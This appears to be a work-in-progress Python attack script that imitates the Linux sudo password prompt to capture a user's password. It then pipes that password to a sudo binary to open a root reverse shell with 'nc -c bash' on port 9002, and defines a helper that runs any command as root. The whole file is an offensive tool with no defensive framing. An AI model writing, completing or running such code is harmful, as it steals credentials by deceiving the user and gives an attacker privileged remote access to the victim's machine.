import os
import getpass
from threading import Thread as t

sudo_path = "sudobk/sudo"

USERNAME = os.getenv("USER")
if USERNAME is None:
    USERNAME = "root"
passkey = getpass.getpass(f"[sudo] password for {USERNAME}: ")
def revshell():
    os.system(f'echo "{passkey}" | {sudo_path} nc -c bash localhost 9002')

def normalsudo(*args):

    # Join all arguments into a single string
    multiarg = " ".join(str(arg) for arg in args)
    os.system(f'echo "{passkey}" | {sudo_path} {multiarg}')


Revshell_T = t(target=revshell, daemon=True)

sudo = t(target=normalsudo, daemon=True)

# NOTE: more stuff is in test.py before going to this (still testing)
